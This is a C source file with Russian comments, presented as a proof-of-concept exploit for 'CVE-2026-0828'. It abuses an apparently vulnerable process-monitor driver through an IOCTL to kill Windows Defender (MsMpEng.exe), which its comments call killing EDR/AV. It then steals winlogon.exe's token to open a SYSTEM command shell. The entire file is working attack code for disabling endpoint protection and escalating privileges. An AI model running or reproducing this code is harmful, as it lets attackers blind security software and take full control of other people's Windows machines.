#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winioctl.h>

// Определения для взаимодействия с уязвимым драйвером
#define DRIVER_NAME L"\\\\.\\STProcessMonitorDriver"
#define IOCTL_KILL_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2200C, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Структура, отправляемая в IOCTL
typedef struct {
    HANDLE ProcessId;
} TERMINATE_PROCESS_INFO;

// --- Вспомогательные функции ---

// Включает привилегию в текущем процессе
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return result && GetLastError() == ERROR_SUCCESS;
}

// Находит PID процесса по имени
DWORD FindProcessId(const wchar_t* processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return 0;

    if (Process32First(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0;
}

// --- Основная эксплуатация ---

// Отправляет IOCTL в драйвер для завершения процесса по PID
BOOL KillProcessViaDriver(DWORD pid) {
    HANDLE hDriver = CreateFile(DRIVER_NAME, GENERIC_READ | GENERIC_WRITE,
                                0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Не удалось открыть драйвер %S. Убедитесь, что он загружен.\n", DRIVER_NAME);
        return FALSE;
    }

    TERMINATE_PROCESS_INFO input;
    input.ProcessId = (HANDLE)(DWORD_PTR)pid;
    DWORD bytesReturned;

    BOOL result = DeviceIoControl(hDriver, IOCTL_KILL_PROCESS,
                                  &input, sizeof(input),
                                  NULL, 0,
                                  &bytesReturned, NULL);

    CloseHandle(hDriver);

    if (result) {
        printf("[+] Успешно завершён процесс с PID: %d\n", pid);
    } else {
        printf("[!] Ошибка при отправке IOCTL для PID: %d (Error: %d)\n", pid, GetLastError());
    }

    return result;
}

// Повышение до SYSTEM через кражу токена у winlogon.exe
BOOL ElevateToSystem() {
    HANDLE hToken, hDuplicateToken;
    DWORD winlogonPid = FindProcessId(L"winlogon.exe");

    if (!winlogonPid) {
        printf("[!] Не найден процесс winlogon.exe\n");
        return FALSE;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
    if (!hProcess) {
        printf("[!] Не удалось открыть winlogon.exe (Error: %d)\n", GetLastError());
        return FALSE;
    }

    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[!] Не удалось открыть токен winlogon.exe (Error: %d)\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken)) {
        printf("[!] Не удалось дублировать токен (Error: %d)\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    CloseHandle(hToken);
    CloseHandle(hProcess);

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    wchar_t cmdLine[] = L"cmd.exe";

    if (!CreateProcessWithTokenW(hDuplicateToken, LOGON_WITH_PROFILE, NULL, cmdLine,
                                  CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[!] Не удалось запустить процесс с токеном SYSTEM (Error: %d)\n", GetLastError());
        CloseHandle(hDuplicateToken);
        return FALSE;
    }

    printf("[+] Успешно запущена SYSTEM shell!\n");
    CloseHandle(hDuplicateToken);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

// --- Точка входа ---
int wmain(int argc, wchar_t* argv[]) {
    printf("[*] CVE-2026-0828 PoC Exploit\n");
    printf("[*] Автор: Исследовательский проект (на основе открытых данных)\n\n");

    if (!EnableDebugPrivilege()) {
        printf("[!] Не удалось включить SeDebugPrivilege. Попробуйте запустить от имени Администратора.\n");
        // Продолжаем, но могут быть проблемы с кражей токена
    } else {
        printf("[+] SeDebugPrivilege включена.\n");
    }

    // Пример: завершаем процесс Windows Defender
    wchar_t* targetName = L"MsMpEng.exe";
    DWORD pid = FindProcessId(targetName);
    if (pid) {
        printf("[*] Найден целевой процесс: %S (PID: %d)\n", targetName, pid);
        
        // 1. Убиваем EDR/AV
        if (KillProcessViaDriver(pid)) {
            printf("[+] Процесс %S успешно уничтожен.\n", targetName);
        } else {
            printf("[!] Не удалось уничтожить %S. Проверьте, загружен ли драйвер.\n", targetName);
        }
    } else {
        printf("[!] Процесс %S не найден.\n", targetName);
    }

    printf("\n[*] Попытка повышения до SYSTEM...\n");
    ElevateToSystem();

    return 0;
}
